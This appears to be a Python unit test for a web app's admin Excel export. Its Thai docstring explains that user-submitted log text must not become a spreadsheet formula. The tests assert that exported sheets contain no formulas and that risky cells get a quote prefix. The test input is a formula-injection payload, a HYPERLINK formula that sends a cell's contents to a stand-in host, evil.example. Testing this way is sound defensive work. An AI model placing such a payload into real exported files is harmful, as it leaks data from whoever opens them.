"""
Excel ที่ export จากหน้าแอดมิน: ข้อความที่ผู้ใช้พิมพ์เองห้ามกลายเป็นสูตร (OPEN_ITEMS 7.8 — ผลตรวจ 5 ต.ค. 2026)

ใครก็ส่งข้อความลง usage log ได้ (POST /admin/usage-logs) แล้วข้อความนั้นไปโผล่ใน Excel ของแอดมิน
=HYPERLINK(...) จะถูกเขียนเป็นสูตรที่ส่งข้อมูลออกนอกเครื่องตอนเปิดไฟล์
"""

from __future__ import annotations

import io
import os
import sys
import unittest
import zipfile

REPO = os.path.normpath(os.path.join(os.path.dirname(__file__), ".."))
sys.path.insert(0, REPO)

from backend.routers import admin as ar  # noqa: E402

EVIL = '=HYPERLINK("http://evil.example/?d="&A2,"คลิก")'


def _sheet_xml(content: bytes) -> str:
    with zipfile.ZipFile(io.BytesIO(content)) as z:
        names = [n for n in z.namelist() if n.startswith("xl/worksheets/sheet")]
        return "".join(z.read(n).decode("utf-8") for n in names)


class TestNoFormulaInAdminExcel(unittest.TestCase):
    def test_single_sheet(self):
        r = ar._xlsx_response([{"msg": EVIL}, {"msg": "+66 81 234 5678"}], [("msg", "ข้อความ")], "x")
        xml = _sheet_xml(r.body)
        self.assertNotIn("<f>", xml)

    def test_multi_sheet(self):
        r = ar._xlsx_response_multi([("a", [{"msg": EVIL}], [("msg", "ข้อความ")])], "x")
        self.assertNotIn("<f>", _sheet_xml(r.body))

    def test_openpyxl_fallback_prefixes_quote(self):
        import pandas as pd

        out = ar._excel_safe_df(pd.DataFrame({"m": [EVIL, "ปกติ", 5]}))
        self.assertEqual(out["m"].tolist()[0], "'" + EVIL)
        self.assertEqual(out["m"].tolist()[1:], ["ปกติ", 5])


if __name__ == "__main__":
    unittest.main()
